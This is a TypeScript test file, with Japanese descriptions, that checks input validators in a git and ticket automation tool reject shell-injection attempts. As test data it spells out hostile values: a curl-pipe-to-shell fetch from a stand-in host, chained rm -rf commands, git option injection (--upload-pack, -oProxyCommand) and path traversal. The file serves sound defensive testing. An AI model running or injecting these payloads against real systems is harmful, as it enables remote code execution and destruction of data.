import { describe, it, expect } from "vitest";
import fs from "fs";
import path from "path";
import os from "os";
import { extractRepositoryPaths, isSafeRepoLocator } from "../src/git/repo-parser.js";
import { isSafeRefName } from "../src/git/exec.js";
import { GitWorktreeManager } from "../src/git/worktree.js";
import { GitHubService } from "../src/git/github.js";

describe("シェルインジェクション対策 (チケット本文由来の入力検証)", () => {
  describe("isSafeRepoLocator", () => {
    it("正規の URL / SCP 形式 / ローカルパスを許可すること", () => {
      expect(isSafeRepoLocator("https://github.com/my-org/frontend.git")).toBe(true);
      expect(isSafeRepoLocator("git@github.com:my-org/backend.git")).toBe(true);
      expect(isSafeRepoLocator("ssh://git@github.com/my-org/app.git")).toBe(true);
      expect(isSafeRepoLocator("/home/user/workspace/my-repo")).toBe(true);
      expect(isSafeRepoLocator("./relative/repo")).toBe(true);
    });

    it("シェルメタ文字・オプション形式・親ディレクトリ参照を拒否すること", () => {
      expect(isSafeRepoLocator("$(curl evil.example | sh)")).toBe(false);
      expect(isSafeRepoLocator("`id`")).toBe(false);
      expect(isSafeRepoLocator("https://github.com/org/repo.git;rm -rf ~")).toBe(false);
      expect(isSafeRepoLocator("--upload-pack=touch /tmp/pwned")).toBe(false);
      expect(isSafeRepoLocator("-oProxyCommand=id")).toBe(false);
      expect(isSafeRepoLocator("/home/user/../../etc")).toBe(false);
      expect(isSafeRepoLocator("https://github.com/org/repo.git && echo hi")).toBe(false);
      expect(isSafeRepoLocator("")).toBe(false);
    });
  });

  describe("extractRepositoryPaths", () => {
    it("チケット本文に混入した危険なトークンを黙って除外すること", () => {
      const text = [
        "リポジトリ:",
        "- https://github.com/my-org/frontend.git",
        "- $(curl http://evil.example/x.sh|sh)",
        "- --upload-pack=id",
        "- `whoami`",
      ].join("\n");
      expect(extractRepositoryPaths(text)).toEqual(["https://github.com/my-org/frontend.git"]);
    });

    it("インライン指定でも危険なトークンを除外すること", () => {
      const text = "リポジトリ: git@github.com:org/app.git, ;rm, -bad";
      expect(extractRepositoryPaths(text)).toEqual(["git@github.com:org/app.git"]);
    });
  });

  describe("isSafeRefName (ブランチ名 / チケットキー)", () => {
    it("通常のチケットキーを許可し、危険な文字列を拒否すること", () => {
      expect(isSafeRefName("STUDY-3")).toBe(true);
      expect(isSafeRefName("PROJ_A-120")).toBe(true);
      expect(isSafeRefName("-D")).toBe(false);
      expect(isSafeRefName("../etc")).toBe(false);
      expect(isSafeRefName("a/b")).toBe(false);
      expect(isSafeRefName("STUDY-3;rm -rf /")).toBe(false);
      expect(isSafeRefName("STUDY 3")).toBe(false);
    });
  });

  describe("GitWorktreeManager", () => {
    it("危険なリポジトリ指定子・チケットキーは git を実行せずに拒否すること", async () => {
      const tmpBase = fs.mkdtempSync(path.join(os.tmpdir(), "aidevflow-sec-"));
      try {
        const manager = new GitWorktreeManager(tmpBase);
        await expect(manager.ensureWorktree("$(id)", "STUDY-1")).rejects.toThrow(/安全でない/);
        await expect(manager.ensureWorktree("--upload-pack=id", "STUDY-1")).rejects.toThrow(/安全でない/);
        await expect(
          manager.ensureWorktree("https://github.com/org/repo.git", "STUDY-1;touch /tmp/x")
        ).rejects.toThrow(/安全でない/);
        await expect(
          manager.ensureWorktree("https://github.com/org/repo.git", "../escape")
        ).rejects.toThrow(/安全でない/);
        // 拒否時に repos/ 配下へ何も作られていないこと
        expect(fs.existsSync(path.join(tmpBase, "repos"))).toBe(false);
      } finally {
        fs.rmSync(tmpBase, { recursive: true, force: true });
      }
    });
  });

  describe("GitHubService", () => {
    it("危険なブランチ名（チケットキー）では PR 作成を中止して null を返すこと", async () => {
      const service = new GitHubService();
      const prUrl = await service.ensurePullRequest("/nonexistent", {
        issueKey: "STUDY-1 --body $(id)",
        summary: "x",
        description: "y",
      });
      expect(prUrl).toBeNull();
    });

    it("危険なブランチ名では PR 状態を UNKNOWN として扱うこと", async () => {
      const service = new GitHubService();
      const state = await service.getPullRequestState("/nonexistent", "STUDY-1;id");
      expect(state).toBe("UNKNOWN");
    });
  });
});
